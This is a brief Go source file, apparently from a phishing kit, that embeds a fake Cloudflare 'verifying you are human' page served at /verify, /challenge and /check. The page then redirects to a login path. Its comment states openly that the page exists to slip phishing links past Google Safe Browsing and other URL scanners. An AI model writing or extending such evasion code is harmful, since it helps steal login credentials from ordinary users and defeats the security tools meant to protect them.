package main

import (
	_ "embed"
)

// challengeHTML is the fake Cloudflare challenge page served at /verify,
// /challenge, and /check. It shows a "verifying you are human" spinner,
// then redirects to /i/flow/login after a few seconds. This helps bypass
// Google Safe Browsing and other URL scanners that flag direct phishing links.
//
//go:embed challenge.html
var challengeHTML []byte
